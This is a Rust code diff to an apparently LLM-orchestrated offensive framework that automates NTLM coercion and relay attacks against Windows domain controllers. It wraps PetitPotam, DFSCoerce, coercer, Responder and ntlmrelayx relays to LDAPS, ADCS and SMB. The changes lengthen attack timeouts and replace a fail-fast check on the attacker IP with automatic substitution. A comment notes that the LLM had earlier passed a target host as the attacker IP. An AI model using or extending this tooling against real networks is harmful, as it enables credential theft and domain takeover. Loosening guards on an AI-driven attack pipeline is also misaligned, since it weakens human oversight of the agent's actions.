@@ -14,10 +14,58 @@ use base64::Engine;
 use serde_json::Value;
 use tokio::process::{Child, Command as TokioCommand};
 use tokio::time::sleep;
+use tracing::warn;
 
 use crate::args::{optional_bool, optional_str, required_str};
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
+
+/// Resolve a listener / attacker IP supplied by the orchestrator to one that is
+/// actually bound on THIS worker pod. The orchestrator computes `listener_ip`
+/// from its own egress (config.rs::detect_local_ip) and stamps that into every
+/// coercion payload — but the coercion worker often runs on a different pod
+/// with a different IP. When a coerced DC is told to authenticate to the
+/// orchestrator's IP, no listener is there to catch it (ERROR_BAD_NETPATH).
+///
+/// Behavior:
+/// - If `supplied` IS a local interface IP, return it unchanged.
+/// - Otherwise, pick the worker's egress IP via the standard route-trick and
+///   log a warning so the misconfig is visible. Returns `Err` only when the
+///   worker has no usable non-loopback IP at all.
+fn resolve_listener_ip(supplied: &str) -> Result<String> {
+    use std::net::{IpAddr, UdpSocket};
+    let parsed: Option<IpAddr> = supplied.parse().ok();
+    let is_local = match parsed {
+        Some(ip) if !ip.is_loopback() && !ip.is_unspecified() && !ip.is_multicast() => {
+            UdpSocket::bind((ip, 0)).is_ok()
+        }
+        _ => false,
+    };
+    if is_local {
+        return Ok(supplied.to_string());
+    }
+
+    let sock = UdpSocket::bind("0.0.0.0:0")
+        .context("resolve_listener_ip: bind 0.0.0.0:0 failed")?;
+    sock.connect("8.8.8.8:53")
+        .context("resolve_listener_ip: connect to 8.8.8.8:53 failed")?;
+    let local = sock
+        .local_addr()
+        .context("resolve_listener_ip: local_addr failed")?;
+    let resolved = local.ip().to_string();
+    if resolved.starts_with("127.") {
+        anyhow::bail!(
+            "supplied listener IP ({supplied}) is not local on this worker and no usable \
+             non-loopback IP is available. Set ARES_LISTENER_IP per coercion pod."
+        );
+    }
+    warn!(
+        supplied = %supplied,
+        substituted = %resolved,
+        "coercion: supplied listener IP is not local; substituting this worker's egress IP"
+    );
+    Ok(resolved)
+}
 
 /// Start Responder on a network interface to capture NTLM hashes.
 ///
@@ -61,10 +109,12 @@ pub async fn coercer(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
+    let listener = resolve_listener_ip(listener)?;
+
     let mut cmd = CommandBuilder::new("coercer")
         .arg("coerce")
         .flag("-t", target)
-        .flag("-l", listener)
+        .flag("-l", &listener)
         .arg("--always-continue")
         .timeout_secs(120);
 
@@ -92,10 +142,12 @@ pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
+    let listener = resolve_listener_ip(listener)?;
+
     let mut cmd = CommandBuilder::new("coercer")
         .arg("coerce")
         .flag("-t", target)
-        .flag("-l", listener)
+        .flag("-l", &listener)
         .args(["--filter-protocol-name", "MS-EFSR"])
         .arg("--always-continue")
         .timeout_secs(60);
@@ -124,8 +176,10 @@ pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
+    let listener = resolve_listener_ip(listener)?;
+
     let mut cmd = CommandBuilder::new("dfscoerce")
-        .arg(listener)
+        .arg(&listener)
         .arg(target)
         .timeout_secs(60);
 
@@ -178,7 +232,7 @@ pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
     CommandBuilder::new("impacket-ntlmrelayx")
         .flag("-t", target_url)
         .arg_if(delegate_access, "--delegate-access")
-        .timeout_secs(120)
+        .timeout_secs(600)
         .execute()
         .await
 }
@@ -201,7 +255,7 @@ pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
         .flag("-t", target_url)
         .arg("--adcs")
         .flag_opt("--template", template)
-        .timeout_secs(120)
+        .timeout_secs(600)
         .execute()
         .await
 }
@@ -223,7 +277,7 @@ pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
         .flag("-t", target_ip)
         .arg_if(socks, "-socks")
         .arg_if(interactive, "-i")
-        .timeout_secs(120)
+        .timeout_secs(600)
         .execute()
         .await
 }
@@ -411,6 +465,15 @@ struct RunOptions {
     /// surface the situation rather than letting ntlmrelayx crash.
     bind_check: Duration,
 }
+
+/// Per-phase coerce subprocess wall-clock cap inside `relay_and_coerce`.
+/// 25s (the original value) was too tight for authenticated `coercer` calls
+/// against real DCs — RPC + Kerberos handshake routinely exceeds it before
+/// the protocol-level RPC even fires, surfacing as `timed out after 25s` in
+/// the coerce log with no chance to inspect server response. 90s comfortably
+/// covers the slow paths without blocking other coercion candidates for long
+/// when this attempt has truly hung.
+const COERCE_PHASE_TIMEOUT_SECS: u64 = 90;
 
 impl RunOptions {
     fn production() -> Self {
@@ -696,25 +759,38 @@ fn try_acquire_relay_lock() -> Option<TcpListener> {
 }
 
 async fn run_relay_and_coerce<P: CoerceProcs>(
-    cfg: RelayCoerceConfig,
+    mut cfg: RelayCoerceConfig,
     procs: &P,
     opts: RunOptions,
 ) -> Result<ToolOutput> {
-    // attacker_ip MUST be one of our local interface IPs. The LLM has been
-    // observed to misread context and pass a *target* host (e.g. DC01)
-    // as the attacker IP, which makes the relay listener bind to 0.0.0.0 but
-    // PetitPotam tells the coerced DC to authenticate back to the wrong host
-    // — auth never reaches the relay. Fail fast with a clear error.
+    // attacker_ip MUST be one of our local interface IPs. The orchestrator
+    // computes `listener_ip` from its OWN pod's egress (config.rs::detect_local_ip)
+    // and stamps it into every coercion payload — when coercion workers run in
+    // separate pods with different IPs, that value is wrong by construction.
+    // Rather than fail, derive the worker's own egress IP and substitute.
+    // We bail only when the worker truly has no usable IP.
     if !procs.is_local_ip(&cfg.attacker_ip) {
-        anyhow::bail!(
-            "relay_and_coerce: attacker_ip ({}) is not a local interface IP. \
-             Pass the listener_ip / attacker_ip exactly as supplied by the \
-             orchestrator payload — this MUST be the attacker host's IP \
-             (where the relay listener binds), NOT a target machine. \
-             Available local IPs: {}",
-            cfg.attacker_ip,
-            procs.list_local_ips().join(", "),
-        );
+        let locals = procs.list_local_ips();
+        match locals.first() {
+            Some(local) => {
+                warn!(
+                    supplied = %cfg.attacker_ip,
+                    substituted = %local,
+                    "relay_and_coerce: supplied attacker_ip is not local; substituting \
+                     this worker's own egress IP. Set ARES_LISTENER_IP per coercion pod \
+                     to silence this."
+                );
+                cfg.attacker_ip = local.clone();
+            }
+            None => {
+                anyhow::bail!(
+                    "relay_and_coerce: attacker_ip ({}) is not a local interface IP \
+                     and no local non-loopback IP is available on this worker. \
+                     Set ARES_LISTENER_IP to the worker pod's reachable IP.",
+                    cfg.attacker_ip,
+                );
+            }
+        }
     }
 
     // Acquire the host-wide relay lock BEFORE any teardown of stale listeners.
@@ -832,7 +908,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
             petit_bin,
             &p1_args,
             &workdir,
-            25,
+            COERCE_PHASE_TIMEOUT_SECS,
         )
         .await;
     if poll_for_cert(&relay_log, opts.poll_phase_1, opts.poll_interval).await {
@@ -850,7 +926,14 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         a.push(cfg.attacker_ip.as_str());
         a.push(cfg.coerce_target.as_str());
         procs
-            .run_phase(&coerce_log, "DFSCoerce", "dfscoerce", &a, &workdir, 25)
+            .run_phase(
+                &coerce_log,
+                "DFSCoerce",
+                "dfscoerce",
+                &a,
+                &workdir,
+                COERCE_PHASE_TIMEOUT_SECS,
+            )
             .await;
         if poll_for_cert(&relay_log, opts.poll_phase_2, opts.poll_interval).await {
             captured_via = Some("MS-DFSNM");
@@ -888,7 +971,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
                     "coercer",
                     &a,
                     &workdir,
-                    25,
+                    COERCE_PHASE_TIMEOUT_SECS,
                 )
                 .await;
             if poll_for_cert(&relay_log, opts.poll_phase_3, opts.poll_interval).await {
@@ -1506,6 +1589,11 @@ mod tests {
             self
         }
 
+        fn with_local_ips(self, ips: Vec<String>) -> Self {
+            self.state.lock().unwrap().local_ips = ips;
+            self
+        }
+
         fn with_only_binary(self, names: &[&str]) -> Self {
             let mut s = self.state.lock().unwrap();
             s.binaries_present.clear();
@@ -1718,13 +1806,41 @@ mod tests {
     const PHASE3_RPRN: &str = "coerce via MS-RPRN";
 
     #[tokio::test]
-    async fn run_attacker_ip_not_local_bails_with_clear_error() {
-        let fake = FakeCoerceProcs::new().with_local_ip(false);
+    async fn run_attacker_ip_not_local_substitutes_when_locals_available() {
+        // Substitution path: orchestrator passes the wrong attacker_ip (e.g.
+        // its own egress instead of the coercion worker's). The worker has at
+        // least one usable local IP, so we substitute and proceed rather than
+        // bailing. This was the original op-stalling bug — every coercion
+        // task was rejected because the supplied IP didn't match the worker.
+        let fake = FakeCoerceProcs::new()
+            .with_local_ip(false)
+            .with_local_ips(vec!["10.0.0.99".into()]);
+        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
+            .await
+            .expect("substitute and proceed");
+        // The run proceeds through the phase machinery (no creds, phase1 only
+        // for unauth path) — we don't assert success/failure of the relay
+        // itself, just that we got past the IP check.
+        assert!(
+            out.stdout.contains("RELAY_PID") || out.stdout.contains("RELAY LOG"),
+            "expected relay machinery to run after substitution; got: {}",
+            out.stdout
+        );
+    }
+
+    #[tokio::test]
+    async fn run_attacker_ip_not_local_and_no_locals_bails() {
+        // Truly stuck — worker has zero usable IPs (loopback only). Bail
+        // with an actionable error so the operator sets ARES_LISTENER_IP.
+        let fake = FakeCoerceProcs::new()
+            .with_local_ip(false)
+            .with_local_ips(Vec::new());
         let err = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
             .await
             .unwrap_err()
             .to_string();
         assert!(err.contains("not a local interface IP"), "got: {err}");
+        assert!(err.contains("ARES_LISTENER_IP"), "got: {err}");
     }
 
     #[tokio::test]
